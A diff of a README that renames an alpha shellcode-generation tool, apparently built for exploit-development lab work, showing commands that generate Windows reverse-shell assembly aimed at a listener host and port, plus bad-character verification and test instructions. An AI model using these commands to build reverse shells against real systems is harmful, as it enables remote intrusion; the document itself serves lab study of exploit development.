@@ -1,6 +1,6 @@
-# Emitera
+# Emitrion
 
-> **Status: alpha.** Emitera is under active development and not yet stable;
+> **Status: alpha.** Emitrion is under active development and not yet stable;
 > interfaces, output, and behavior may change without notice. It grew out of
 > earlier work on the osed-toolkit emitter. As functionality stabilizes, the
 > status above and the notes below will be updated to reflect what is
@@ -42,19 +42,19 @@ Requires Python 3.13+ and [uv](https://docs.astral.sh/uv/).
 uv sync
 
 # Generate a reverse shell (assembly source, debug runner, contract docs)
-uv run emitera emitera/manifests/revshell.yaml \
+uv run emitrion emitrion/manifests/revshell.yaml \
   --template ir_reverse_shell \
   --lhost 192.168.1.100 --lport 9001 \
   --out emitter_out/
 
 # Generate without assembling (no assembler needed)
-uv run emitera emitera/manifests/revshell.yaml \
+uv run emitrion emitrion/manifests/revshell.yaml \
   --template ir_reverse_shell \
   --no-assemble \
   --out emitter_out/
 
 # Run a command (calc.exe by default)
-uv run emitera emitera/manifests/calc.yaml \
+uv run emitrion emitrion/manifests/calc.yaml \
   --template ir_run_command \
   --no-assemble \
   --out emitter_out/
@@ -67,12 +67,12 @@ Assembly (Keystone or NASM) is only available on the Windows lab VM. Use
 
 ```bash
 # Full verification pipeline (assemble + bad-char scan + JSON report)
-uv run python -m emitera.verify emitera/manifests/revshell.yaml \
+uv run python -m emitrion.verify emitrion/manifests/revshell.yaml \
   --template ir_reverse_shell \
   --lhost 10.0.0.1 --lport 9001
 
 # JSON output for scripting
-uv run python -m emitera.verify emitera/manifests/calc.yaml \
+uv run python -m emitrion.verify emitrion/manifests/calc.yaml \
   --template ir_run_command --json
 ```
 
@@ -138,7 +138,7 @@ The emitter writes to `emitter_out/` (or `--out`):
 ```bash
 uv run pytest          # full suite (500+ tests)
 uv run ruff check .    # linting
-uv run mypy emitera/workflow/   # strict type checking on IR module
+uv run mypy emitrion/workflow/   # strict type checking on IR module
 ```
 
 Tests that require an assembler (`test_full_build_assembles`) are expected
@@ -147,7 +147,7 @@ to skip on Mac.
 ## Project structure
 
 ```
-emitera/
+emitrion/
   api_database.py       # Win32 API records, struct definitions, module load order
   schema.py             # YAML manifest loader and validator
   stack_alloc.py        # EBP-relative stack slot allocator
